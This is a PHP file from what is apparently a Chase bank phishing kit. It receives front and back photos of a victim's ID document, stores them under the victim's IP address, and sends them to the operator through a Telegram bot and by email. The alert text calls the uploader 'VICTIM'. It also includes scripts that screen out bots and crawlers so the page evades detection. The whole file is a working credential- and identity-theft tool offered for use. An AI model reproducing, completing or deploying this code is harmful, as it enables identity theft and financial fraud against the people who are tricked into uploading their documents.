<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

$uploadok=0;
$PublicIP = $_SERVER['REMOTE_ADDR'];

function sendPhotoToTg($chatID, $file, $caption, $token){
$url    = "https://api.telegram.org/bot$token";
$post_fields = [
			'chat_id'   => $chatID,
			'photo'     => new CURLFile(realpath($file)),
			'caption'     => $caption
			   ];
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
	curl_setopt($ch, CURLOPT_URL, $url. "/sendPhoto"); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
	curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	$err = curl_error($ch);
	curl_close($ch);
}
	
if (($_FILES['my_filefront']['name']!="") && getimagesize($_FILES['my_filefront']['tmp_name']) !== false){
	$file = $_FILES['my_filefront']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Front_ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_filefront']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);
	if ($send_tg == 1) {
	sendPhotoToTg($tgid , $path_filename_ext, "🔷🌀 CHASE ".str_replace('_',' ',$filename), $tgtoken);
		};
	};
	
if (($_FILES['my_fileback']['name']!="") && getimagesize($_FILES['my_fileback']['tmp_name']) !== false){
	$file = $_FILES['my_fileback']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Back_ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_fileback']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);
	if ($send_tg == 1) {
	sendPhotoToTg($tgid , $path_filename_ext, "🔷🌀 CHASE ".str_replace('_',' ',$filename), $tgtoken);
		};
	};
	
if($uploadok==1){
$Info_LOG="🔷🌀 CHASE ID UPLOADED BY VICTIM IP: $PublicIP
Check RST folder for IMAGES with ipname";
if($Send_Email == 1 ){
            $subject = $PublicIP.' 🔷🌀 CHASE ID UPLOADED';$headers = 'From: YoCHI <yochbase@yochcoinchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			mail($to, $subject, $Info_LOG, $headers);
		};
if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
	};
header("location:complete?sessioninnI_IX=".md5(rand(100, 999999999))."");

?>





